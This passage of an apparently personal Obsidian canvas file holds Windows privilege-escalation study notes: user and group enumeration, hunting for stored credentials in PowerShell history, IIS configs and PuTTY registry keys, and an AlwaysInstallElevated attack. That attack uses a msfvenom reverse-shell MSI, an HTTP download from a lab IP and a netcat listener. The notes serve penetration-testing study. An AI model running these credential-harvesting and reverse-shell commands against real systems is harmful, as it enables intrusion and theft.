		{"id":"8d1b4c5e91e99b76","type":"text","text":"* **What to Look For**: The current username. Identify if the user is an admin or belongs to privileged groups.\n- **Potential Exploit**: If the user is an admin, directly attempt Privesc sub-node number 1. If not, look for misconfigurations.\n- **Look for**: Any high-value privileges that are enabled. Common ones include:\n    - **SeDebugPrivilege**: Allows debugging of processes, often used to escalate privileges.\n    - **SeImpersonatePrivilege**: Allows the user to impersonate another user.\n    - **SeBackupPrivilege** and **SeRestorePrivilege**: Can be used to back up and restore files, potentially overwriting sensitive system files. \n``` Powershell\n#Get all information about current user, take a look at the enabled tokens\nwhoami /all\n\n#Show only privileges\nwhoami /priv\n\n#Get information about specific user\nnet user < UserName > \n```\n\n``` PowerShell\n# Get information about specific local user\nGet-WmiObject -Class Win32_UserAccount -Filter \"Name=< UserName >\"\nGet-LocalUser -Name duser | Select * \n```","x":1580,"y":5500,"width":1000,"height":560},
		{"id":"925158903f89e395","type":"text","text":"``` powershell\n#Check if you are Admin\n$cuaccess=[System.Security.Principal.WindowsIdentity]::GetCurrent()\n$cuprivilege=New-Object System.Security.Principal.WindowsPrincipal($cuaccess)\n$cuprivilege.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)\n```","x":2840,"y":5600,"width":805,"height":137},
		{"id":"498e2d04cf912642","type":"text","text":"## User Enumeration","x":883,"y":5741,"width":357,"height":78},
		{"id":"1994f82f8b8512f8","type":"text","text":" - **Look for**: Weak account policies, such as no password requirements, which could be exploited.\n``` powershell\n## Information about password requirements\nnet accounts \n```","x":2840,"y":5780,"width":823,"height":143},
		{"id":"d5bfda678c4005d0","type":"text","text":"1. **`icacls\\ Get-ACL`**:\n    \n    - Displays or modifies discretionary access control lists (DACLs) on specified files.\n        - **Look for**:\n            - Files or folders where the current user has write permissions. This can be used to replace executable files with malicious ones.\n            - Misconfigured permissions that allow broader access than \n\n``` powershell\n## Display access control lists (ACL) on specified files.\nicacls \"C:\\example\\file.txt\"\n\nGet-Acl \"C:\\example\\file.txt\"\n```\n\n```PowerShell\n## Get access control lists (ACL) of all files and folders within a directory recursively:\nicacls \"C:\\example\\folder\" /T\n\nGet-ChildItem \"C:\\example\\folder\\\" -Recurse | Get-Acl | Format-Table \n```","x":2840,"y":5960,"width":923,"height":454},
		{"id":"3ed48e94757891c5","type":"text","text":"- **Look for**:\n     - **Local Group Memberships**: Membership in groups like `Administrators`, `Server Operators`, `Backup Operators`, etc., can provide elevated privileges.\n   - **Account Settings**: Check if the account has any special configurations, such as password never expiring, or if the user has the ability to change their password.\n``` powershell\n#All available groups\nnet localgroup \n\n#Info about specific a group\nnet localgroup < GroupName > \n\n#Add user to group\nnet localgroup < GroupName > < UserName > /add \n```","x":1580,"y":6100,"width":780,"height":396},
		{"id":"e52f0d2795d28cb6","type":"text","text":"## Users and groups Enumeration","x":224,"y":6240,"width":336,"height":120},
		{"id":"cec118cde28f7148","type":"text","text":"## Group Enumeration","x":883,"y":6254,"width":357,"height":89},
		{"id":"ed6e2ae2d666f6d2","type":"text","text":"## Powershell History","x":-1720,"y":645,"width":480,"height":63},
		{"id":"79bf9fa59c55ab50","type":"text","text":"## Saved Credentials(PuTTY, IIS)","x":-1720,"y":740,"width":480,"height":57},
		{"id":"5f90eb80bdc95dbe","type":"text","text":" **Look for:** commands that includes a password directly as part of the PowerShell command line\n\n```CMD\ntype %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt # Get Powershell History\n```\n \n```PowerShell\ntype $Env:userprofile\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt # Get Powershell History\n```\n\n```PowerShell\nGet-Clipboard # Get last copied thing\n```\n\n* If there are any credentials, those could be useful to escalate privileges\n","x":5440,"y":7771,"width":1143,"height":300,"color":"#0599f5"},
		{"id":"eda875a2ecba47b4","type":"text","text":"Saved Credentials","x":6883,"y":7584,"width":250,"height":66,"color":"#0599f5"},
		{"id":"b30f7807d972baf1","type":"text","text":"**Look for:** If there are any save credentials\n``` powershell\n# List saved credentials\ncmdkey /list  \n```","x":6676,"y":7771,"width":664,"height":150,"color":"#0599f5"},
		{"id":"a955c47ed8fb7fde","type":"text","text":"* If there are any credentials, you could run command prompt as that user\n\n```\nrunas /savecred /user:username cmd.exe\n```\n\n","x":6676,"y":7951,"width":664,"height":120,"color":"#0599f5"},
		{"id":"bf5c5d487c2121ec","type":"text","text":"PowerShell History","x":5908,"y":7584,"width":207,"height":72,"color":"#0599f5"},
		{"id":"9236593c7c7aeefa","type":"text","text":"IIS Configuration","x":7783,"y":7590,"width":250,"height":60,"color":"#0599f5"},
		{"id":"d97b71c1664ef532","type":"text","text":"**Look for:** store passwords for databases or configured authentication mechanisms\n```\ntype C:\\inetpub\\wwwroot\\web.config | findstr connectionString\ntype C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionString\n```\n","x":7458,"y":7771,"width":900,"height":150,"color":"#0599f5"},
		{"id":"f5979c67007fbea2","type":"text","text":"PuTTY","x":9088,"y":7560,"width":250,"height":60,"color":"#0599f5"},
		{"id":"d9b4a7c14a3fc807","type":"text","text":"**While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials.**\n\n```\nreg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f \"Proxy\" /s\n```\n\n**Note:** Simon Tatham is the creator of PuTTY (and his name is part of the path), not the username for which we are retrieving the password. The stored proxy username should also be visible after running the command above.\nJust as putty stores credentials, any software that stores passwords, including browsers, email clients, FTP clients, SSH clients, VNC software and others, will have methods to recover any passwords the user has saved","x":8643,"y":7736,"width":1140,"height":287,"color":"#0599f5"},
		{"id":"2843e3b6360e1b31","type":"text","text":"```CMD\n# Checks the machine level registry key.\nReg Query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\n```\n**Look for** output something similar to the following\n    HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\Installer\n        AlwaysInstallElevated    REG_DWORD    0x1\n        DisableMSI    REG_DWORD    0x0\n\n\n```CMD\n# Check our user key, which is in the current user hive. \nReg Query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\n```\n**Look for** output something similar to the following\n    HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer \n        AlwaysInstallElevated REG_DWORD 0x1\n\n","x":10379,"y":7643,"width":1041,"height":397,"color":"#0599f5"},
		{"id":"72d5068d686263c2","type":"text","text":"Escalate While Installing","x":10775,"y":7479,"width":250,"height":60,"color":"#0599f5"},
		{"id":"26b47a4cbdab9a5c","type":"text","text":"If you checked those registry keys and those seemed similar to the above ones, you can create a payload, upload it to the target and spin up netcat listener and run that payload to get privileged shell. Here are the steps:\n     On Kali \n         `1.Create a payload with msfvenom:`\n        `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o privesc.msi`\n        \n        `2.Spin up a python server:`\n        `python -m http.server 7180`\n\n         `4.Set up a netcat listener:`\n         `nc -lvnp 2626`\n\n    On Windows\n        `Download the malicious file:`\n        3.wget http://192.168.109.130:7180/privesc.msi -o privesc.msi\n\n        `5.Run the payload:`\n        `msiexec /quiet /qn /i privesc.msi`","x":10067,"y":8180,"width":1667,"height":618,"color":"#0599f5"},
		{"id":"e45af7cf2f2f700c","type":"text","text":"`# Create the 'Installer' key if it doesn't exist`\n`New-Item -Path \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\Installer\" -Force`\n\n`# Create the 'AlwaysInstallElevated' DWORD value and set it to 1`\n`New-ItemProperty -Path \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\Installer\" -Name \"AlwaysInstallElevated\" -PropertyType DWord -Value 1`\n\n\n`reg add \"HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\" /v AlwaysInstallElevated /t REG_DWORD /d 1 /f`\n","x":11480,"y":7700,"width":980,"height":283,"color":"#0599f5"}
	],
	"edges":[
		{"id":"d0dc2ab83ca8de65","fromNode":"be46450db2cae69a","fromSide":"right","toNode":"179094e6ba2d2b2c","toSide":"left"},
		{"id":"64037bd9776cb381","fromNode":"179094e6ba2d2b2c","fromSide":"right","toNode":"c5163b6b6363c2cc","toSide":"left"},
		{"id":"78f90cab6eb5565b","fromNode":"179094e6ba2d2b2c","fromSide":"right","toNode":"0293d6c1b4598b68","toSide":"left"},
		{"id":"45a63d56fe5e62ee","fromNode":"0293d6c1b4598b68","fromSide":"right","toNode":"600906e6cbe095c9","toSide":"left"},
		{"id":"feef6b662059d6df","fromNode":"0293d6c1b4598b68","fromSide":"right","toNode":"e52f0d2795d28cb6","toSide":"left"},
		{"id":"f066da1ae1b1a9e4","fromNode":"a05de09f9d7dad60","fromSide":"right","toNode":"a0b951863e97e01b","toSide":"left"},
		{"id":"9415289301901b53","fromNode":"a0b951863e97e01b","fromSide":"right","toNode":"dfb727dcc6ed7eae","toSide":"left"},
		{"id":"11b1596ade6b48cf","fromNode":"dfb727dcc6ed7eae","fromSide":"right","toNode":"2c065c4f9b53fb4d","toSide":"left"},
		{"id":"8c2d9c467bb8943c","fromNode":"2c065c4f9b53fb4d","fromSide":"right","toNode":"e05e9a5b1a82d0d1","toSide":"left"},
		{"id":"ac086375b62ddb69","fromNode":"2c065c4f9b53fb4d","fromSide":"right","toNode":"71c0359516cb7711","toSide":"left"},
		{"id":"53b3b1aa0801a8ea","fromNode":"e05e9a5b1a82d0d1","fromSide":"right","toNode":"532de4a52720ec91","toSide":"left"},
		{"id":"de4c5f84244bf35c","fromNode":"71c0359516cb7711","fromSide":"right","toNode":"f6808bf87ee97a1b","toSide":"left"},
		{"id":"c1fa3262c8305e48","fromNode":"600906e6cbe095c9","fromSide":"right","toNode":"a05de09f9d7dad60","toSide":"left"},
		{"id":"22a141cd8ad54b9b","fromNode":"5e48ae0e0f1ab924","fromSide":"right","toNode":"7d70237c675cebc5","toSide":"left"},
		{"id":"0d294e35a2ec3dcd","fromNode":"374c876881c8bb7c","fromSide":"right","toNode":"703c7defdf6773d9","toSide":"left"},
		{"id":"42b77c46047d6265","fromNode":"47278f5e45b06dbf","fromSide":"right","toNode":"71d7fa52d78485de","toSide":"left"},
		{"id":"22b99275640bb6ef","fromNode":"c5163b6b6363c2cc","fromSide":"right","toNode":"e6154d5f4d65e09d","toSide":"left"},
		{"id":"eef0944c9b8ba064","fromNode":"e6154d5f4d65e09d","fromSide":"right","toNode":"a0b43af4b97d53e5","toSide":"left"},
		{"id":"68b6f585d4030cbd","fromNode":"a0b43af4b97d53e5","fromSide":"right","toNode":"374c876881c8bb7c","toSide":"left"},
		{"id":"056cc2c7b2f13dab","fromNode":"a0b43af4b97d53e5","fromSide":"right","toNode":"91e94e49805a18e0","toSide":"left"},
		{"id":"697849f21e68f9d8","fromNode":"91e94e49805a18e0","fromSide":"right","toNode":"d01ff3ae477bd6d8","toSide":"left"},
		{"id":"0b118a4cd896421b","fromNode":"e6154d5f4d65e09d","fromSide":"right","toNode":"47278f5e45b06dbf","toSide":"left"},
		{"id":"2b7296f76c7f7caf","fromNode":"d01ff3ae477bd6d8","fromSide":"right","toNode":"9ac754a60f9e613f","toSide":"left"},
		{"id":"3301421811955f68","fromNode":"703c7defdf6773d9","fromSide":"right","toNode":"9ac754a60f9e613f","toSide":"left"},
		{"id":"deadeb007c6dc6b9","fromNode":"9ac754a60f9e613f","fromSide":"right","toNode":"46c1560599835fe5","toSide":"left"},
		{"id":"b9e3d6a09db196d1","fromNode":"e6154d5f4d65e09d","fromSide":"right","toNode":"ce9ccc7c0e51dd61","toSide":"left"},
		{"id":"a02c5f81c07a578b","fromNode":"ce9ccc7c0e51dd61","fromSide":"right","toNode":"95ca6015ba1034aa","toSide":"left"},
		{"id":"230f321fca9dbe80","fromNode":"a0b43af4b97d53e5","fromSide":"right","toNode":"ff732b12b148d58e","toSide":"left"},
		{"id":"26dcda0c74e9781f","fromNode":"ff732b12b148d58e","fromSide":"right","toNode":"ea7f2a13f546dc8d","toSide":"left"},
		{"id":"b85c92a4fe6c6797","fromNode":"10e38a401095bdbb","fromSide":"right","toNode":"f82fa6fce5beb074","toSide":"left"},
		{"id":"98cdda12da75a09e","fromNode":"f82fa6fce5beb074","fromSide":"right","toNode":"c814b6cece9faa34","toSide":"left"},
		{"id":"e47ac01657f5e523","fromNode":"c814b6cece9faa34","fromSide":"right","toNode":"91239944f8a7edd5","toSide":"left"},
		{"id":"32c2e64c84a32be7","fromNode":"91239944f8a7edd5","fromSide":"right","toNode":"c226757e89689a23","toSide":"left"},
		{"id":"f40d639b6d8369a5","fromNode":"0deb57519b817e85","fromSide":"right","toNode":"122733e5cf29c97d","toSide":"left"},
		{"id":"128634931926b9bc","fromNode":"176c9b654332b164","fromSide":"right","toNode":"8b1a617012d650e7","toSide":"left"},
		{"id":"34476646e881aa04","fromNode":"ae863a09f9efa0b4","fromSide":"right","toNode":"3f3bc9f3ddbddb3d","toSide":"left"},
		{"id":"82071a1b1c495311","fromNode":"2b689f4d5e70d54e","fromSide":"right","toNode":"52e4812348bdb22c","toSide":"left"},
		{"id":"450f804642137cf7","fromNode":"85f1b08da9f60486","fromSide":"right","toNode":"09ac2679e50f6d23","toSide":"left"},
		{"id":"052e200e361444a1","fromNode":"d590cb6ac5ed98f5","fromSide":"right","toNode":"32a7a61fd959c561","toSide":"left"},
		{"id":"5b311d136d354ac4","fromNode":"27058d0c157af620","fromSide":"right","toNode":"3b898aa7f6fe1202","toSide":"left"},
		{"id":"d9d921b3c39b2d07","fromNode":"0293d6c1b4598b68","fromSide":"right","toNode":"10e38a401095bdbb","toSide":"left"},
		{"id":"3ea341192c58d69e","fromNode":"10e38a401095bdbb","fromSide":"right","toNode":"0deb57519b817e85","toSide":"left"},
		{"id":"eb1f6f14d465bb3f","fromNode":"608fdb9ce399c55d","fromSide":"right","toNode":"0fd625fb25bd7682","toSide":"left"},
		{"id":"c787fdebf2f05847","fromNode":"0293d6c1b4598b68","fromSide":"right","toNode":"3bd934717d6cbe33","toSide":"left"},
		{"id":"77e2be993a7e8b7d","fromNode":"3bd934717d6cbe33","fromSide":"right","toNode":"608fdb9ce399c55d","toSide":"left"},
		{"id":"10a8ce18990e46c0","fromNode":"3bd934717d6cbe33","fromSide":"right","toNode":"176c9b654332b164","toSide":"left"},
		{"id":"4cffe054d20725fd","fromNode":"3bd934717d6cbe33","fromSide":"right","toNode":"ae863a09f9efa0b4","toSide":"left"},
		{"id":"1be79b05154ec79e","fromNode":"3bd934717d6cbe33","fromSide":"right","toNode":"2b689f4d5e70d54e","toSide":"left"},
		{"id":"0c24bfe951f4ea4d","fromNode":"3bd934717d6cbe33","fromSide":"right","toNode":"85f1b08da9f60486","toSide":"left"},
		{"id":"3292bece7e192e48","fromNode":"3bd934717d6cbe33","fromSide":"right","toNode":"d590cb6ac5ed98f5","toSide":"left"},
		{"id":"4e5e6504fbc1cf23","fromNode":"3bd934717d6cbe33","fromSide":"right","toNode":"27058d0c157af620","toSide":"left"},
		{"id":"d5cdbbb95c7618f6","fromNode":"c5163b6b6363c2cc","fromSide":"right","toNode":"66bb7c823362e9e8","toSide":"left"},
		{"id":"d88ab4245281b275","fromNode":"66bb7c823362e9e8","fromSide":"right","toNode":"069f95b3afe3e7f8","toSide":"left"},
		{"id":"da248f8481a6bbf7","fromNode":"66bb7c823362e9e8","fromSide":"right","toNode":"70cb92a429e23f5a","toSide":"left"},
		{"id":"a54df5e73393c1e4","fromNode":"66bb7c823362e9e8","fromSide":"right","toNode":"f4ac75b58e011232","toSide":"left"},
		{"id":"82ea11501303ec2a","fromNode":"66bb7c823362e9e8","fromSide":"right","toNode":"35c0d89f91ba38a3","toSide":"left"},
		{"id":"9c3fd7a09d075ebf","fromNode":"e52f0d2795d28cb6","fromSide":"right","toNode":"498e2d04cf912642","toSide":"left"},
		{"id":"17ccd66fd883dc6f","fromNode":"498e2d04cf912642","fromSide":"right","toNode":"8d1b4c5e91e99b76","toSide":"left"},
		{"id":"5b21be20a307ab64","fromNode":"e52f0d2795d28cb6","fromSide":"right","toNode":"cec118cde28f7148","toSide":"left"},
		{"id":"2b5a93c9f3b7a379","fromNode":"8d1b4c5e91e99b76","fromSide":"right","toNode":"925158903f89e395","toSide":"left"},
		{"id":"bcd24a06cd4f0f03","fromNode":"8d1b4c5e91e99b76","fromSide":"right","toNode":"1994f82f8b8512f8","toSide":"left"},
		{"id":"61be227fc19745bb","fromNode":"925158903f89e395","fromSide":"top","toNode":"c92c43aa886618cd","toSide":"left","label":"If you are Administrator"},
		{"id":"64704012f055102d","fromNode":"8d1b4c5e91e99b76","fromSide":"right","toNode":"5e3a6e70dc9bc222","toSide":"left"},
		{"id":"b48d4acf9c4ecccf","fromNode":"8d1b4c5e91e99b76","fromSide":"right","toNode":"d5bfda678c4005d0","toSide":"left"},
		{"id":"97ead2a3e8e93f01","fromNode":"3ed48e94757891c5","fromSide":"right","toNode":"d5bfda678c4005d0","toSide":"left"},
		{"id":"4ca736bb2e084004","fromNode":"cec118cde28f7148","fromSide":"right","toNode":"3ed48e94757891c5","toSide":"left"},
		{"id":"c881f49b31fb2406","fromNode":"bf5c5d487c2121ec","fromSide":"bottom","toNode":"5f90eb80bdc95dbe","toSide":"top"},
		{"id":"e9aafc2ed49485b6","fromNode":"eda875a2ecba47b4","fromSide":"bottom","toNode":"b30f7807d972baf1","toSide":"top"},
		{"id":"d63c882ac4722b1b","fromNode":"b30f7807d972baf1","fromSide":"bottom","toNode":"a955c47ed8fb7fde","toSide":"top"},
		{"id":"d78c83c2cc9b40a1","fromNode":"9236593c7c7aeefa","fromSide":"bottom","toNode":"d97b71c1664ef532","toSide":"top"},
		{"id":"781278fdae415c23","fromNode":"f5979c67007fbea2","fromSide":"bottom","toNode":"d9b4a7c14a3fc807","toSide":"top"},
		{"id":"9ea8ae8d5104d5d8","fromNode":"72d5068d686263c2","fromSide":"bottom","toNode":"2843e3b6360e1b31","toSide":"top"},
		{"id":"a4cd28e292443bd6","fromNode":"2843e3b6360e1b31","fromSide":"bottom","toNode":"26b47a4cbdab9a5c","toSide":"top"}
	]
}